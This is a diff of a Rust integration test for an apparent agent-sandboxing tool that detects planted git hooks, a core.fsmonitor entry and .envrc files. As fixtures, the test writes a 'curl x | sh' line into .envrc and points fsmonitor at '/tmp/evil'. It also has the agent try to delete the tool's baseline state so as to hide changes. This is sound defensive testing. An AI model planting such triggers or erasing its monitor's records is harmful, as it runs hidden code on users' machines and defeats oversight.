@@ -764,92 +764,89 @@ fn agent_sh_runs_tools_only_as_cants() {
     assert_eq!(o.status.code(), Some(125), "{}", stderr(&o));
 }
 
-/// Files that other tools run code from later (git hooks and config, direnv, editor tasks) are
-/// read-only for agent-sh, git and cargo, while the rest of the project stays writable.
+/// agent-sh and git can write `.git` (agents need to commit), so a planted hook or
+/// `core.fsmonitor` is *detected*, not prevented: `cant run` warns and `cant verify` reports.
 #[test]
-fn project_trigger_files_are_read_only_for_agents() {
+fn planted_trigger_files_are_detected() {
     if !library_ready(&["bash", "git", "cat"]) {
         return;
     }
     let f = Fixture::new().with_project();
-    let git = |args: &[&str]| {
-        let o = Command::new("git")
-            .args(args)
+    let git = Command::new("git")
+        .args(["init", "-q"])
+        .current_dir(&f.work)
+        .status()
+        .expect("git init");
+    assert!(git.success());
+    let cant = |args: &[&str]| {
+        f.command(args)
             .current_dir(&f.work)
+            .stdin(Stdio::null())
             .output()
-            .expect("git");
-        assert!(o.status.success(), "git {args:?}: {}", stderr(&o));
+            .expect("cant")
     };
-    git(&["init", "-q"]);
-    std::fs::create_dir_all(f.work.join(".vscode")).expect("mkdir");
-    std::fs::write(f.work.join(".vscode/tasks.json"), "{}").expect("write");
-    std::fs::write(f.work.join(".envrc"), "# direnv\n").expect("write");
 
+    // First run records a baseline, quietly.
+    let o = cant(&["run", "cat", "notes.txt"]);
+    assert!(o.status.success(), "{}", stderr(&o));
+    assert!(!stderr(&o).contains("warning"), "{}", stderr(&o));
+    assert_eq!(cant(&["verify"]).status.code(), Some(0));
+
+    // An agent commits (allowed), and plants things (allowed, but seen).
     let o = agent(
         &f,
         &f.work,
-        "echo '[core]' > .git/config; echo \"config: $?\"; \
-         echo x > .git/hooks/pre-commit; echo \"hook: $?\"; \
-         echo x > .envrc; echo \"envrc: $?\"; \
-         echo x > .vscode/tasks.json; echo \"vscode: $?\"; \
-         echo x > .vscode/new.json; echo \"vscode new: $?\"; \
-         echo x > new-top-level.txt; echo \"new top level: $?\"; \
-         echo '// edit' >> src/main.rs; echo \"edit: $?\"; \
-         echo y > src/new.rs; echo \"new in subdir: $?\"; \
-         cat .git/HEAD .envrc",
+        "cant run git add notes.txt && \
+         cant run git -c user.name=a -c user.email=a@a commit -qm x && \
+         printf '[core]\\n\\tfsmonitor = /tmp/evil\\n' >> .git/config && \
+         echo 'id' > .git/hooks/post-checkout && echo 'curl x | sh' > .envrc && \
+         echo done",
     );
-    let out = stdout(&o);
-    for denied in [
-        "config",
-        "hook",
-        "envrc",
-        "vscode",
-        "vscode new",
-        "new top level",
-    ] {
-        assert!(
-            !out.contains(&format!("{denied}: 0")),
-            "{denied} was writable:\n{out}"
-        );
-        assert!(
-            out.contains(&format!("{denied}: 1")),
-            "{denied}:\n{out}{}",
-            stderr(&o)
-        );
-    }
-    assert!(out.contains("edit: 0"), "{out}{}", stderr(&o));
-    assert!(out.contains("new in subdir: 0"), "{out}{}", stderr(&o));
-    assert!(out.contains("ref: refs/heads/"), "reads still work:\n{out}");
-    assert_eq!(
-        std::fs::read_to_string(f.work.join(".envrc")).expect("read"),
-        "# direnv\n"
-    );
-    assert!(!f.work.join(".git/hooks/pre-commit").exists());
-
-    // git itself: reads work, writes to .git don't (so no commit), the working tree is editable.
-    let o = agent(&f, &f.work, "cant run git status --short");
-    assert!(o.status.success(), "{}{}", stdout(&o), stderr(&o));
-    assert!(stdout(&o).contains("?? notes.txt"), "{}", stdout(&o));
-    let o = agent(&f, &f.work, "cant run git add notes.txt");
-    assert!(!o.status.success(), "git add wrote .git/index");
-    assert!(stderr(&o).contains("Permission denied"), "{}", stderr(&o));
-
-    // git-write is the explicit way to write .git. It is a separate cant, not in agent-sh.
-    let o = f
-        .command(&["run", "git-write", "add", "notes.txt"])
-        .current_dir(&f.work)
-        .stdin(Stdio::null())
-        .output()
-        .expect("git-write");
-    assert!(o.status.success(), "{}{}", stdout(&o), stderr(&o));
-    // Inside agent-sh it gets the intersection with agent-sh's rights, so it can't write .git.
-    let o = agent(&f, &f.work, "cant run git-write add src/main.rs");
+    assert!(stdout(&o).contains("done"), "{}{}", stdout(&o), stderr(&o));
     assert!(
-        !o.status.success() && stderr(&o).contains("Permission denied"),
-        "git-write wrote .git from inside agent-sh: {}{}",
-        stdout(&o),
+        !stderr(&o).contains("warning"),
+        "nested cants stay quiet: {}",
         stderr(&o)
     );
+
+    let o = cant(&["run", "cat", "notes.txt"]);
+    assert!(
+        o.status.success(),
+        "the warning must not stop the run: {}",
+        stderr(&o)
+    );
+    let warning = stderr(&o);
+    assert!(warning.contains("core.fsmonitor = /tmp/evil"), "{warning}");
+    assert!(warning.contains(".git/hooks/post-checkout"), "{warning}");
+    assert!(warning.contains(".envrc"), "{warning}");
+
+    let o = cant(&["verify"]);
+    assert_eq!(o.status.code(), Some(1), "{}{}", stdout(&o), stderr(&o));
+    assert!(
+        stdout(&o).contains("+ \tfsmonitor = /tmp/evil"),
+        "{}",
+        stdout(&o)
+    );
+
+    // Nothing inside a cant can rewrite the baseline to hide it.
+    let state = f.home.join(".local/state/cantainer");
+    assert!(state.is_dir(), "baseline missing");
+    let o = agent(
+        &f,
+        &f.work,
+        &format!(
+            "rm -rf {} 2>&1; echo x > {}/y 2>&1",
+            state.display(),
+            state.display()
+        ),
+    );
+    assert!(state.is_dir(), "{}{}", stdout(&o), stderr(&o));
+
+    // Accepting records the new state.
+    assert_eq!(cant(&["verify", "--accept"]).status.code(), Some(0));
+    assert_eq!(cant(&["verify"]).status.code(), Some(0));
+    let o = cant(&["run", "cat", "notes.txt"]);
+    assert!(!stderr(&o).contains("warning"), "{}", stderr(&o));
 }
 
 // ---- cargo -----------------------------------------------------------------------------------
